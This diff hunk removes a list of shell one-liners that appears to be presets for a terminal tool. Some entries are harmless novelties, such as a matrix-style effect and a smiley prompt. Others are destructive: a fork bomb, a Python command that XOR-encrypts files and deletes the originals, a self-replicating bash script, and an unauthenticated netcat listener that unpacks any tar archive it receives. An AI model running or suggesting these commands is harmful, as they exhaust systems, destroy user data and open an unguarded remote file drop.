@@ -1,7 +1,0 @@
-Fork Bomb: 1999 Unix Shell Fork Bomb: :(){ :|:& };:
-Matrix Style: Matrix Style Terminal: tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"
-Update X/Twitter: Update X status if possible: curl -u twitter-username -d status="Hello X, rMETAshell rocks!" -d source="cURL" http://twitter.com/statuses/update.xml
-File Server: Start a file server using port 7000: while true; do nc -l 7000 | tar -xvf -; done
-Smiley Faces: Smiley faces bash prompt: $ PS1="\`if [ \$? = 0 ]; then  echo \e[33\;40m\\\^\\\_\\\^\e[0m; else  echo \e[36\;40m\\\-\e[0m\\\_\e[36\;40m\\\-\e[0m; fi\` \u \w:\h)"
-XOR file encryption: XOR file Encryption and Deletion: python -c "import os;[open(file_path+'.enc','wb').write(bytearray(open(file_path,'rb').read())^(bytearray('LoxoSec'.encode()*-(-os.path.getsize(file_path)//len('LoxoSec')))))+os.remove(file_path) for file_path in [os.path.join('.','LoxoSec',filename) for filename in os.listdir('.') if os.path.isfile(os.path.join('.','LoxoSec',filename))]]"
-ShadowSutra by CyberCoral: Bash-Script recursive file generator: a=${BASH_SOURCE:-$0};c=$(which cp);n="$1";l="$2";if [ "$n" = "" ]; then n=1; fi;if [ "$l" = "" ]; then l=${#a}; ((l-=3));fi;m=$n;((n+=1));((n**2));((m+=1));$c $PWD/$a $PWD/"${a:0:l}$m.sh";. ${a:0:l}$m.sh $n $l;. ${a%.*}.sh $n $l
